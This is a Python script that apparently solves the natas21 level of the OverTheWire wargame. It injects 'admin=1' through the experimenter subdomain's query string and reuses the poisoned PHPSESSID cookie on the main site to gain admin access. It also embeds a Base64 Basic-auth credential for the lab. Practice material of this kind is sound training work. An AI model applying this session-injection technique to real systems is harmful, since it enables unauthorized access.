import requests

headers = {
    'Authorization': 'Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg=='
}

url = 'http://natas21.natas.labs.overthewire.org/index.php'

payload = 'align=center&fontsize=100%&bgcolor=yellow&admin=1&debug&submit'
experimenter_url = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php'

phpsessid = 'kjtof8itdju7kktrrev3hcucb5'

with requests.Session() as session:
    request = session.get(url=experimenter_url, headers=headers)

    phpsessid = request.cookies.get_dict()['PHPSESSID']

    cookies = {
        'PHPSESSID': phpsessid
    }

    session.get(url=f"{experimenter_url}?{payload}", headers=headers, cookies=cookies)
    request = session.get(url=url, headers=headers, cookies=cookies)

    print(request.content.decode('utf-8'))
